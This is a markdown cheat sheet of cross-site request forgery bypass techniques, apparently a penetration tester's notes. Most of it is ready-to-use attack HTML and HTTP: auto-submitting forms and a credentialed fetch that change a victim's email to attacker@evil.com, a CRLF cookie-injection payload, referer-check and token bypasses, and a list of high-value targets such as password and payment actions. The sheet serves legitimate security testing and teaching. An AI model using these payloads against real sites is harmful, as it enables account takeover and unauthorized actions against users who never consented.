# CSRF Bypass Techniques

## Basic Checks

- [ ] No CSRF token present
- [ ] Weak/predictable CSRF token
- [ ] Token not validated server-side
- [ ] Token reusable across sessions
- [ ] Token tied to session but not user

---

## Token Bypass Methods

### Remove Token
```http
POST /change-email HTTP/1.1

email=attacker@evil.com
```
Remove `csrf_token` parameter entirely — sometimes server doesn't validate if missing.

### Empty Token
```http
csrf_token=
csrf_token=null
csrf_token=undefined
```

### Use Another User's Token
1. Create two accounts
2. Get CSRF token from Account B
3. Use Account B's token in Account A's session

---

## Method Override

### Change POST to GET
```html
<form action="https://target.com/change-email" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

### Method Override Header
```html
<form action="https://target.com/change-email" method="GET">
  <input type="hidden" name="_method" value="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

---

## Content-Type Bypass

### Change Content-Type
```http
Content-Type: text/plain
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
```
Some frameworks only validate CSRF for specific content types.

---

## Referer Bypass

### Remove Referer Header
```html
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

### Weak Referer Validation
```html
<script>
  history.pushState('', '', '/?target.com');
</script>
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
```
If validation only checks if referer *contains* target domain.

---

## Cookie-Based Token Bypass

### Token Duplicated in Cookie
If app checks `csrf_token` cookie == `csrf_token` param:

```html
<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" 
     onerror="document.forms[0].submit();"/>

<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="fake">
</form>
```
Inject cookie via CRLF, then use matching value in form.

---

## PoC Templates

### Basic Auto-Submit
```html
<html>
<body>
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

### With URL History (hide payload)
```html
<html>
<body>
  <script>history.pushState('', '', '/')</script>
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

### JSON Body CSRF
```html
<html>
<body>
  <form action="https://target.com/api/change-email" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

### Fetch API (with credentials)
```html
<script>
fetch('https://target.com/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=attacker@evil.com'
});
</script>
```

---

## High-Value CSRF Targets

- [ ] Email change
- [ ] Password change
- [ ] Account deletion
- [ ] API key generation/revocation
- [ ] Payment/transfer actions
- [ ] Admin actions
- [ ] OAuth app authorization

---

## SameSite Cookie Bypass

### SameSite=Lax Bypass
- GET requests still send cookies
- Method override: `GET /action?_method=POST`
- Top-level navigation triggers

### SameSite=None Requirements
- Must have `Secure` flag
- Works with cross-origin requests

---

## References
- https://portswigger.net/web-security/csrf
- https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
